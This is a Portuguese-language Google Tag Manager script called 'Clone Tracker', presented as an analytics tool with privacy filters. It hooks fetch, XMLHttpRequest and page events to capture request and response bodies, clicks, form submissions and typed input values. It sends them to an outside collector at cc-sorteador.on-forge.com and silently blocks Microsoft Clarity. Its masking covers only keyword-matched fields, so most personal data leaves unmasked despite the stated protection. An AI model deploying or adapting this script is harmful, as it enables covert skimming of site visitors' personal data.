<!--
  SCRIPT COMPATÍVEL COM GTM (ES5) - COM FILTROS PARA CLARITY

  INSTRUÇÕES:
  1. Copie TODO este código
  2. No Google Tag Manager: Tags > Nova > HTML Personalizado
  3. Cole este código completo
  4. Acionador: All Pages
  5. Salvar e Publicar

  RECURSOS:
  - Bloqueia envio de dados para Clarity
  - Mascara campos sensíveis
  - Filtra URLs com informações privadas
-->

<script>
(function() {
    'use strict';

    // ========== CONFIGURAÇÕES ==========
    var COLLECTOR_URL = 'https://cc-sorteador.on-forge.com/api/collect';
    var BLOCK_CLARITY = true; // Bloquear Microsoft Clarity completamente
    var MASK_SENSITIVE_DATA = true; // Mascarar dados sensíveis

    // Domínios e URLs para bloquear
    var BLOCKED_DOMAINS = [
        'clarity.ms',
        'clarity.microsoft.com',
        'c.clarity.ms',
        'www.clarity.ms'
    ];

    // Palavras-chave sensíveis para mascarar
    var SENSITIVE_KEYWORDS = [
        'password', 'senha', 'pass',
        'card', 'cartao', 'cvv', 'cvc',
        'cpf', 'rg', 'social',
        'token', 'bearer', 'auth',
        'credit', 'credito',
        'secret', 'key', 'api_key'
    ];

    // ========== FUNÇÕES AUXILIARES ==========

    // Verifica se uma URL é de domínio bloqueado
    function isBlockedDomain(url) {
        if (!url) return false;
        var urlLower = url.toLowerCase();
        for (var i = 0; i < BLOCKED_DOMAINS.length; i++) {
            if (urlLower.indexOf(BLOCKED_DOMAINS[i]) > -1) {
                return true;
            }
        }
        return false;
    }

    // Verifica se um texto contém palavras sensíveis
    function containsSensitiveKeyword(text) {
        if (!text) return false;
        var textLower = text.toLowerCase();
        for (var i = 0; i < SENSITIVE_KEYWORDS.length; i++) {
            if (textLower.indexOf(SENSITIVE_KEYWORDS[i]) > -1) {
                return true;
            }
        }
        return false;
    }

    // Mascara dados sensíveis em objetos
    function maskSensitiveData(obj) {
        if (!obj || typeof obj !== 'object') return obj;

        var masked = {};
        for (var key in obj) {
            if (obj.hasOwnProperty(key)) {
                var keyLower = key.toLowerCase();
                var value = obj[key];

                // Se a chave contém palavra sensível, mascarar
                if (containsSensitiveKeyword(keyLower)) {
                    masked[key] = '[MASKED]';
                }
                // Se o valor é string e contém palavra sensível, mascarar
                else if (typeof value === 'string' && containsSensitiveKeyword(value)) {
                    masked[key] = '[MASKED]';
                }
                // Se é objeto, recursão
                else if (typeof value === 'object' && value !== null) {
                    masked[key] = maskSensitiveData(value);
                }
                // Caso contrário, manter valor
                else {
                    masked[key] = value;
                }
            }
        }
        return masked;
    }

    // Mascara URLs com query params sensíveis
    function maskSensitiveUrl(url) {
        if (!url) return url;

        try {
            var urlObj = new URL(url);
            var params = urlObj.searchParams;

            if (params) {
                var iterator = params.entries();
                var entry = iterator.next();
                while (!entry.done) {
                    var key = entry.value[0];
                    if (containsSensitiveKeyword(key)) {
                        params.set(key, '[MASKED]');
                    }
                    entry = iterator.next();
                }
            }

            return urlObj.toString();
        } catch (e) {
            // Se falhar parse, retornar URL original
            return url;
        }
    }

    // ========== BLOQUEIO DO CLARITY ==========

    if (BLOCK_CLARITY) {
        // Bloquear scripts do Clarity
        var originalCreateElement = document.createElement;
        document.createElement = function(tagName) {
            var element = originalCreateElement.call(document, tagName);

            if (tagName && tagName.toLowerCase() === 'script') {
                var originalSetAttribute = element.setAttribute;
                element.setAttribute = function(name, value) {
                    if (name === 'src' && isBlockedDomain(value)) {
                        console.log('[Clone Tracker] Bloqueado Clarity:', value);
                        return; // Não define o src
                    }
                    return originalSetAttribute.call(this, name, value);
                };
            }

            return element;
        };

        // Bloquear propriedade clarity do window
        if (window.clarity) {
            window.clarity = function() {
                console.log('[Clone Tracker] Clarity bloqueado');
            };
        }

        console.log('[Clone Tracker] Clarity bloqueado');
    }

    // ========== RASTREAMENTO ==========

    // Gera ou recupera session ID
    function getSessionId() {
        var sessionId = sessionStorage.getItem('clone_tracker_session');
        if (!sessionId) {
            sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            sessionStorage.setItem('clone_tracker_session', sessionId);
        }

        if (!sessionId || sessionId === 'null' || sessionId === 'undefined') {
            sessionId = 'session_fallback_' + Date.now();
            sessionStorage.setItem('clone_tracker_session', sessionId);
        }

        return sessionId;
    }

    // Captura informações do navegador
    function getBrowserInfo() {
        var sessionId = getSessionId();

        return {
            sessionId: sessionId,
            domain: window.location.hostname || 'unknown',
            url: maskSensitiveUrl(window.location.href) || '',
            referrer: maskSensitiveUrl(document.referrer) || '',
            screenResolution: (screen.width || 0) + 'x' + (screen.height || 0),
            language: navigator.language || navigator.userLanguage || 'unknown',
            timestamp: new Date().toISOString(),
            requests: []
        };
    }

    var capturedRequests = [];
    var originalFetch = window.fetch;

    // Intercepta Fetch API
    if (originalFetch) {
        window.fetch = function() {
            var args = Array.prototype.slice.call(arguments);
            var url = typeof args[0] === 'string' ? args[0] : (args[0] && args[0].url) || '';
            var options = args[1] || {};
            var method = options.method || 'GET';

            // Bloquear Clarity
            if (isBlockedDomain(url)) {
                console.log('[Clone Tracker] Fetch bloqueado (Clarity):', url);
                return Promise.reject(new Error('Blocked by Clone Tracker'));
            }

            // Não interceptar chamadas para o próprio collector
            if (url.indexOf('/api/collect') > -1) {
                return originalFetch.apply(this, args);
            }

            var requestData = {
                type: 'fetch',
                url: maskSensitiveUrl(url),
                method: method,
                timestamp: new Date().toISOString()
            };

            // Captura body se existir e mascarar dados sensíveis
            if (options.body) {
                try {
                    var bodyObj = JSON.parse(options.body);
                    requestData.body = MASK_SENSITIVE_DATA ? maskSensitiveData(bodyObj) : bodyObj;
                } catch (e) {
                    requestData.body = '[Unable to parse]';
                }
            }

            capturedRequests.push(requestData);

            return originalFetch.apply(this, args).then(function(response) {
                var responseData = {
                    type: 'fetch_response',
                    url: maskSensitiveUrl(url),
                    status: response.status,
                    statusText: response.statusText,
                    timestamp: new Date().toISOString()
                };

                var clonedResponse = response.clone();
                clonedResponse.text().then(function(body) {
                    try {
                        var bodyObj = JSON.parse(body);
                        responseData.body = MASK_SENSITIVE_DATA ? maskSensitiveData(bodyObj) : bodyObj;
                    } catch (e) {
                        responseData.bodyPreview = body.substring(0, 500);
                    }
                    capturedRequests.push(responseData);
                }).catch(function() {});

                return response;
            });
        };
    }

    // Intercepta XMLHttpRequest
    var originalXHROpen = XMLHttpRequest.prototype.open;
    var originalXHRSend = XMLHttpRequest.prototype.send;

    XMLHttpRequest.prototype.open = function(method, url) {
        // Bloquear Clarity
        if (isBlockedDomain(url)) {
            console.log('[Clone Tracker] XHR bloqueado (Clarity):', url);
            this._blocked = true;
            return;
        }

        this._requestData = {
            type: 'xhr',
            method: method,
            url: maskSensitiveUrl(url),
            timestamp: new Date().toISOString()
        };
        return originalXHROpen.apply(this, arguments);
    };

    XMLHttpRequest.prototype.send = function(body) {
        var self = this;

        // Se foi bloqueado, não enviar
        if (this._blocked) {
            return;
        }

        if (this._requestData) {
            if (body) {
                try {
                    var bodyObj = JSON.parse(body);
                    this._requestData.body = MASK_SENSITIVE_DATA ? maskSensitiveData(bodyObj) : bodyObj;
                } catch (e) {
                    this._requestData.body = '[Unable to parse]';
                }
            }

            capturedRequests.push(this._requestData);

            this.addEventListener('load', function() {
                var responseData = {
                    type: 'xhr_response',
                    url: maskSensitiveUrl(self._requestData.url),
                    status: self.status,
                    statusText: self.statusText,
                    timestamp: new Date().toISOString()
                };

                try {
                    var bodyObj = JSON.parse(self.responseText);
                    responseData.body = MASK_SENSITIVE_DATA ? maskSensitiveData(bodyObj) : bodyObj;
                } catch (e) {
                    responseData.bodyPreview = self.responseText.substring(0, 500);
                }

                capturedRequests.push(responseData);
            });
        }

        return originalXHRSend.apply(this, arguments);
    };

    // Captura cliques
    document.addEventListener('click', function(e) {
        var element = e.target;
        if (!element) return;

        var clickData = {
            type: 'click',
            tagName: element.tagName || '',
            id: element.id || '',
            className: element.className || '',
            text: element.innerText ? element.innerText.substring(0, 100) : '',
            href: element.href ? maskSensitiveUrl(element.href) : '',
            timestamp: new Date().toISOString()
        };

        capturedRequests.push(clickData);
    }, true);

    // Captura submissão de formulários
    document.addEventListener('submit', function(e) {
        var form = e.target;
        var formData = new FormData(form);
        var formFields = {};

        var entries = [];
        if (formData.entries) {
            var iterator = formData.entries();
            var entry = iterator.next();
            while (!entry.done) {
                entries.push(entry.value);
                entry = iterator.next();
            }
        }

        for (var i = 0; i < entries.length; i++) {
            var key = entries[i][0];
            var value = entries[i][1];

            if (containsSensitiveKeyword(key)) {
                formFields[key] = '[MASKED]';
            } else {
                formFields[key] = value;
            }
        }

        var submitData = {
            type: 'form_submit',
            action: maskSensitiveUrl(form.action),
            method: form.method,
            fields: formFields,
            timestamp: new Date().toISOString()
        };

        capturedRequests.push(submitData);
    }, true);

    // Captura mudanças de input
    var inputDebounce = {};
    document.addEventListener('input', function(e) {
        var input = e.target;
        if (input.tagName === 'INPUT' || input.tagName === 'TEXTAREA') {
            var fieldName = input.name || input.id || 'unknown';

            clearTimeout(inputDebounce[fieldName]);
            inputDebounce[fieldName] = setTimeout(function() {
                var value = input.value;

                // Mascara campos sensíveis
                if (input.type === 'password' || containsSensitiveKeyword(fieldName)) {
                    value = '[MASKED]';
                }

                var inputData = {
                    type: 'input_change',
                    fieldName: fieldName,
                    fieldType: input.type,
                    value: value,
                    timestamp: new Date().toISOString()
                };

                capturedRequests.push(inputData);
            }, 500);
        }
    }, true);

    // Envia os dados para o servidor
    function sendToServer() {
        if (capturedRequests.length === 0) {
            return;
        }

        var data = getBrowserInfo();

        // Copia requests e filtra
        data.requests = [];
        for (var i = 0; i < capturedRequests.length; i++) {
            var request = capturedRequests[i];

            // Não enviar requisições bloqueadas para Clarity
            if (request.url && isBlockedDomain(request.url)) {
                continue;
            }

            data.requests.push(request);
        }

        if (!data.sessionId) {
            console.error('[Clone Tracker] ERRO: sessionId vazio!');
            data.sessionId = 'session_error_' + Date.now();
        }

        console.log('[Clone Tracker] Enviando:', data.sessionId, '(' + data.requests.length + ' eventos)');

        capturedRequests = [];

        if (originalFetch) {
            originalFetch(COLLECTOR_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data),
                mode: 'cors'
            })
            .then(function(response) {
                console.log('[Clone Tracker] Status:', response.status);
                return response.json();
            })
            .then(function(result) {
                console.log('[Clone Tracker] Sucesso:', result);
            })
            .catch(function(error) {
                console.error('[Clone Tracker] Erro:', error);
            });
        } else {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', COLLECTOR_URL, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.onload = function() {
                if (xhr.status === 201) {
                    console.log('[Clone Tracker] Sucesso');
                }
            };
            xhr.send(JSON.stringify(data));
        }
    }

    setInterval(sendToServer, 10000);

    window.addEventListener('beforeunload', function() {
        if (capturedRequests.length > 0) {
            var data = getBrowserInfo();
            data.requests = [];
            for (var i = 0; i < capturedRequests.length; i++) {
                data.requests.push(capturedRequests[i]);
            }

            if (navigator.sendBeacon) {
                navigator.sendBeacon(COLLECTOR_URL, JSON.stringify(data));
            } else {
                sendToServer();
            }
        }
    });

    capturedRequests.push({
        type: 'page_load',
        url: maskSensitiveUrl(window.location.href),
        timestamp: new Date().toISOString()
    });

    setTimeout(sendToServer, 2000);

    console.log('[Clone Tracker] Initialized - Session:', getSessionId());
})();
</script>
